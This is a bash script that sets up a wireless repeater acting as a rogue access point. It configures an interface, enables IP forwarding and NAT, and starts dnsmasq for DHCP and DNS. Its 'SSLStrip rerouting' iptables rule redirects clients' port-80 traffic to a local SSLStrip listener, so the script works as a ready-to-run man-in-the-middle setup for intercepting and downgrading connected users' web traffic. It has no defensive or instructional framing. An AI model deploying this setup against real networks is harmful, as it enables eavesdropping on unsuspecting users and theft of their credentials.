#!/bin/bash
set -e

# Interfaces that are used
INTERNET=wlp5s0
REPEATER=wlp0s20u2

echo "[ ] Configuring interface"
ip addr del 192.168.100.1/24 dev wlp0s20u2 2> /dev/null || true
ip addr add 192.168.100.1/24 dev $REPEATER

echo "[ ] Enabling IP forwaring"
sysctl net.ipv4.ip_forward=1

echo "[ ] Enabling NAT"
iptables -t nat -A POSTROUTING -o $INTERNET -j MASQUERADE
iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $REPEATER -o $INTERNET -j ACCEPT

echo "[ ] Enabling SSLStrip rerouting"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

echo "[ ] Starting DHCP and DNS service"
dnsmasq -d -C dnsmasq.conf

